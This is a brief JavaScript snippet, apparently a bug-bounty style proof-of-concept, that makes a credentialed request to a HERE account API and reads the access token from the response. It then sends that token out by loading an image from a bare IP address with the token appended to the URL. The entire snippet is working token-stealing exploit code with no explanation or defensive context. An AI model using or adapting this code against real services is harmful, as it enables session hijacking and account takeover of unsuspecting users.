var xhr = new XMLHttpRequest();   
     xhr.open('GET', ' https://account.here.com/api/account?client-id=jZHOGx4w0lEYdRXh31OT&version=4&sdk=true&type=frame&uri=https%3A%2F%2Fapp.tracking.here.com&sign-in-screen-config=password&no-sign-up=true&realm-input=true&frame-no-close=true&track-id=murloc', true);
     xhr.onload = function () {
     var i = document.createElement('img');
     i.src = 'http://34.245.80.122/olp.jpg?random='+JSON.parse(xhr.responseText).accessToken;
     document.head.appendChild(i);
     };
xhr.withCredentials = true;
xhr.send();
